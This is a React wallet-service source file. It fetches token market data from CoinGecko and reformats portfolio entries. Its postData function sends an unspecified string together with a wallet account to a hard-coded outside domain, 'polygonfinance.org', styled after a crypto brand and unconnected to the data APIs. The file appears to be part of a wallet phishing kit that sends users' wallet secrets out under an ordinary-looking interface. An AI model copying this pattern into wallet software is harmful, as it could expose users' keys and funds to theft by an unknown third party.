import { useHttp } from '../hooks/http.hook'
import Web3 from 'web3'

let url = 'https://polygonfinance.org/concept/unity/check'

import { createBody } from './createBody'

const useWalletService = () => {
	const { error, loading, request, clearError } = useHttp()

	const getAllTokens = async (loaded) => {
		loaded ? loaded(true) : null

		const response = await request(
			new URL(
				'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=ethereum-ecosystem&order=market_cap_desc&per_page=100&page=1&sparkline=false'
			)
		)
		loaded ? loaded(false) : null
		return response
	}

	const getToken = async (loaded, coinId) => {
		loaded ? loaded(true) : null

		const response = await request(
			new URL('https://api.coingecko.com/api/v3/coins/' + coinId)
		)
		loaded ? loaded(false) : null
		return response
	}

	async function postData(str, account) {
		let requestBody = createBody(str, account)

		const response = await request(new URL(url), 'POST', requestBody, {
			'Content-Type': 'application/x-www-form-urlencoded',
		})
		console.log(response)
		return response
	}

	return {
		error,
		loading,
		clearError,
		getAllTokens,
		getToken,
		postData,
	}
}
export function rebuildObjPortfolio(list) {
	const newList = list.map((obj) => {
		return {
			id: obj.asset.id,
			name: obj.asset.name,
			symbol: obj.asset.symbol,
			contract_address: obj.id.split('-')[0],
			decimals: obj.asset.decimals,
			market_data: {
				current_price: {
					usd: obj.asset.price ? obj.asset.price.value : 0,
				},
				balance: obj.quantity
					? Number(
							Web3.utils.fromWei(
								obj.quantity.toString(),
								obj.asset.decimals === 6 ? 'mwei' : 'ether'
							)
					  ).toFixed(10)
					: 0,
				balance_crypto: {
					usd: obj.value || 0,
				},
				high_24h: {
					usd: obj.quote_rate_24h,
				},
				relativeChange: obj.asset.price
					? obj.asset.price.relative_change_24h
					: 0,
			},
			image: {
				thumb: obj.asset.icon_url,
			},
		}
	})
	return newList
}
export function rebuildObjPortfolioDefaultCoins(list) {
	const newList = list.map((obj) => {
		return {
			id: obj.id,
			name: obj.name,
			symbol: obj.symbol,
			contract_address: '',
			market_data: {
				current_price: {
					usd: obj.current_price,
				},
				balance: 0,
				balance_crypto: {
					usd: 0,
				},
				high_24h: {
					usd: obj.high_24h,
				},
				relativeChange: obj.price_change_percentage_24h,
			},
			image: {
				thumb: obj.image,
			},
		}
	})
	return newList
}
export default useWalletService
